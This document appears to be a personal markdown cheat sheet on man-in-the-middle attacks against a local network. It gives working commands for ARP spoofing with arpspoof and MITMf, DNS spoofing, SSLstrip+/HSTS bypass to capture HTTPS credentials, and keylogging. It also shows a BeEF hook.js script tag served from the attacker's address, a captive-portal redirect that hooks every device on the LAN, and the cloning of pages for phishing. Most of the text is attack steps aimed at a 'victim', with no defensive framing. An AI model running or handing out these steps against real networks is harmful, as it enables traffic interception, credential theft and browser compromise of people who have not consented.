# Man in the middle attack

## Tables des matière
 - [ARP protocol](#ARP-protocol)
 - [Manual ARP spoofing](#Manual-ARP-spoofing)
 - [HTTP trafic sniffing](#HTTP-trafic-sniffing)
 - [DNS spoofing](#DNS-spoofing)
 - [HTTPS credentials sniffing](#HTTPS-credentials-sniffing)
 - [Hooking browsers with BEEF](#Hooking-browsers-with-BEEF)
 - [Some stuff you can do with mitmf](#Some stuff-you-can-do-with-mitmf)
 - [Cloning any webpage](#Cloning-any-webpage)
 - [Ettercap](#Ettercap)

### ARP protocol
	
Discover MAC adresses of an IP adress.

Show the CAM (MAC adress table) : `arp -a`

The CAM is update when you ping a IP in your LAN.
	
**Scapy** : a python program able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, store or read them using pcap files, match requests and replies, and much more. 

### Manual ARP spoofing

Open tilix in order to have multiple terminals.

You must be able to forward packets between the victim and the router `echo 1 > /proc/sys/net/ipv4/ip_forward`

Let the router thinks that you have de MAC adress of the victim. `arpspoof -i <interface> -t <router_ip> <victim_ip>`

Let the victim thinks that you have de MAC adress of the of the router. `arpspoof -i <interface> -t <victim_ip> <router_ip>`

You can launch driftnet in order to see what pictures the victim is looking at.

### HTTP trafic sniffing

Use **MITMf** : `./mitmf.py --spoof --arp --gateway <gateway_ip> --targets <targets_ip>`

You are able to see which http web site the targets are visiting.

### DNS spoofing

DNS configuration is in `MITMf/confif/mitmf.conf` file.

Enter a domain name HTTP domain on which you want to perform the attack (category DNS ipv4 queries)

Use the parameter `--dns` in addition when you launched mitmf.py

When the victim go on the http website, he is redirected on the server that you specify in `mitmf.conf`
	
### HTTPS credentials sniffing 

Go to `mitmf.conf` and do your configuration on SSLstrip+ category

Use the parameter `--hsts` in addition when you launched mitmf.py

### Hooking browsers with BEEF

Start the beef-xss program `beef-xss`

Go to `http://127.0.0.1:3000/ui/panel` -> authenticate yourself with user/password

Create a fake html file in your own http server. 

Add `<script src="http://<your_ip_address>:3000/hook.js"></script>` between the two <head> and </head> tags  

When someone goes to the page, he is executing the script and you are able to see the target machine ip on the graphical beef application. If your click on the IP adress, you can perform lot's of attack against him if his browser is outdated.

In order to have all the devices connected to your LAN you can type : `./mitmf.py -i <interface> --spoof --arp --gateway <gateway_ip> --captive --portalurl http://<your_server_ip_adress>`

If you don't specify a particular target, when one of the LAN device request a page on Internet, he will be redirected to your server, he will ran the script and you can see it in your  beef application.

### Some stuff you can do with mitmf

You can specify the argument `--screen --interval <num_sec>` to screenshot the web browser every 20 seconds for example. Each screen go to the log/ folder.

You can specify the argument `--upsidedownternet` to rotate every picture of the victim current http page.

Key looger, shell sock...

### Cloning any webpage

Right click --> Save Page As 

Move the files (and folders) in `/var/www/html`, rename the main .html by index.html in apache2

### Ettercap

Program useful for mitm attack.
	 
